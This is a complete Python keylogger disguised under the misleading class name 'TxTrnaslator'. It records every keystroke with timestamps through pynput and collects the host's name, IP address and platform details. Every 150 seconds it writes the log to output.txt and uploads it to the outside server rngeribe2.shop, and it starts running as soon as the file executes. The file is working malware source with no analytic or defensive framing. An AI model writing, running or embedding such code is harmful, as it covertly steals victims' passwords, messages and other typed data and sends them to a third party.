import platform
import socket
import threading
from pynput import keyboard
from pynput.keyboard import Listener
from email import encoders
from datetime import datetime
import os
import requests

SEND_REPORT_EVERY = 150
class TxTrnaslator:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.log = ""
        self.last_time = None
        self.current_entry = ""
        self.timer = None
        self.save_interval = 2


    def appendlog(self, string):
        self.log = self.log + string

    def save_data(self, key):
        if self.timer:
            self.timer.cancel()

        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        current_time = datetime.now()

        if self.last_time is None or (current_time - self.last_time).total_seconds() > self.save_interval:
            if self.current_entry:
                self.appendlog(self.current_entry + '\n')
            self.current_entry = current_time.strftime("%Y-%m-%d %H:%M:%S") + ' ' + current_key
        else:
            self.current_entry += current_key

        self.last_time = current_time

        self.timer = threading.Timer(self.save_interval, self.save_current_entry)
        self.timer.start()

    def save_current_entry(self):
        if self.current_entry:
            if(self.current_entry.strip() == ""):
                return
            self.appendlog(self.current_entry + '\n')
            self.current_entry = ""

    def report(self):
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        if(self.log == ""):
            return
        file_path = self.save_text_to_file()
        
        with open(file_path, 'rb') as f:
            url = "https://rngeribe2.shop/uploadt"

            files = {"file": f}
            data = {"caption": ""}
            response = requests.post(url, files=files, data=data)
        self.log = ""
        

    def save_text_to_file(self, file_name="output.txt"):
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(self.log)

        return os.path.abspath(file_name)

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)

    
    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

txtranslator = TxTrnaslator(SEND_REPORT_EVERY)
txtranslator.run()